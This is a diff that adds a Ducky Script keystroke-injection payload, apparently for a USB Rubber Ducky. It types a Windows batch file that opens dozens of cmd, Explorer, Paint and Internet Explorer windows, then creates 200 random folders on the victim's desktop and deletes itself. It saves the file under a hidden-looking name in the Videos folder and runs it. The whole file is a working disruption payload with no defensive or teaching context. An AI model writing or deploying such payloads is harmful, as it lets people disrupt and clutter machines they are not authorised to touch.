@@ -1,0 +1,57 @@
+DELAY 750
+CONTROL ESCAPE
+DELAY 1000
+STRING notepad
+DELAY 1000
+ENTER
+DELAY 1000
+STRING @echo off
+ENTER
+STRING for /l %%x in (1, 1, 30) do (start cmd.exe
+ENTER
+STRING start explorer.exe
+ENTER
+STRING start mspaint.exe
+ENTER
+STRING start iexplore.exe)
+ENTER
+STRING set loopcount=200
+ENTER
+STRING :loop
+ENTER
+STRING md "%userprofile%\Desktop\%random%"
+ENTER
+STRING set /a loopcount=loopcount-1
+ENTER
+STRING if %loopcount%==0 goto exitloop
+ENTER
+STRING goto loop
+ENTER
+STRING :exitloop
+ENTER
+STRING ( del /q /f "%~f0" >nul 2>&1 & ex it /b 0 )
+CONTROL S
+DELAY 1000
+CONTROL A
+DELAY 250
+STRING %userprofile%\Videos\!rip$.bat
+DELAY 250
+TAB
+RIGHTARROW
+DOWNARROW
+TAB
+TAB
+TAB
+ENTER
+DELAY 250
+ALT F4
+DELAY 250
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+ENTER
+DELAY 1000
+STRING start cmd /c "%userprofile%\Videos\!rip$.bat"
+ENTER
+ALT F4
